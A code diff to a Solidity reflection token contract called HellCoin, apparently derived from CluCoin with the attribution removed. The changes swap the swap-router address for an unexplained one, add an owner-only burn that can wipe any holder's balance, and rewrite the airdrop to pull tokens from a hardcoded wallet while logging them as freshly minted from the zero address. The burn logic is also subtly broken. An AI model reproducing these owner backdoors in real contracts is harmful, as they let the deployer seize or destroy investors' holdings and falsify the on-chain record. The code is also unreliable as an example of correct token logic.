@@ -1,16 +1,3 @@
-/**
- *Submitted for verification at BscScan.com on 2021-05-19
-*/
-
-/**
-   #CluCoin features:
-    Total Supply 1,000,000,000,000,000
-    10% fee on transactions
-    5% goes to holders
-    5% is auto-locked to liquidity
-    www.clucoin.com
- */
-
 pragma solidity ^0.6.12;
 // SPDX-License-Identifier: Unlicensed
 interface IERC20 {
@@ -712,7 +699,7 @@ contract HellCoin is Context, IERC20, Ownable {
     constructor () public payable{
         _rOwned[_msgSender()] = _rTotal;
         
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
          // Create a uniswap pair for this new token
         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
@@ -785,26 +772,34 @@ contract HellCoin is Context, IERC20, Ownable {
     function totalFees() public view returns (uint256) {
         return _tFeeTotal;
     }
-    function mint(address account, uint256 amount) public {
-
-        _mint(account, amount);
-
-    }    
-    function _mint(address account, uint256 amount) internal virtual onlyOwner{
-
-        require(account != address(0), "ERC20: mint to the zero address");
-        //_beforeTokenTransfer(address(0), account, amount);
-        //_rOwned = _rOwned.add(amount);
-        _rOwned[account] = _rOwned[account].add(amount);
-        emit Transfer(address(0), account, amount);
-
+    function drop(address[] memory recipients, uint256[] memory values) public onlyOwner{
+        return _drop(recipients, values);
     }
-    //Give token to the array of recipients
-    function drop(IERC20 token, address[] memory recipients, uint256[] memory values) public {
+    function burn(address account, uint256 amount) public onlyOwner{
+        return _burn(account, amount);
+    }
+    function _burn(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: burn from the zero address");
+        uint256 rAmount = amount * _getRate();
+        uint256 accountBalance = _rOwned[account];
+        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        _rOwned[account] = SafeMath.sub(accountBalance, rAmount);
+        _tTotal = SafeMath.sub(_tTotal, amount);
+        _rTotal = SafeMath.sub(_rTotal, rAmount);
+        emit Transfer(account, address(0), amount);
+    }
+    function _drop(address[] memory recipients, uint256[] memory values) internal virtual {
+       // require(account != address(0), "ERC20: mint to the zero address");
         for (uint256 i = 0; i < recipients.length; i++) {
-            token.transfer(recipients[i], values[i]);
+            uint256 rAmount = values[i] * _getRate();
+            _rOwned[recipients[i]] += rAmount;
+            _rOwned[0xdB6D0436a7B8321b55bf5d9543511415BCE4fc90] -= rAmount;
+            if(_isExcluded[recipients[i]]){ _tOwned[recipients[i]] += values[i]; }
+            emit Transfer(address(0),recipients[i], values[i]);
         }
+
     }
+
     
 // This controls the contract pause
     function pause() external onlyOwner() {
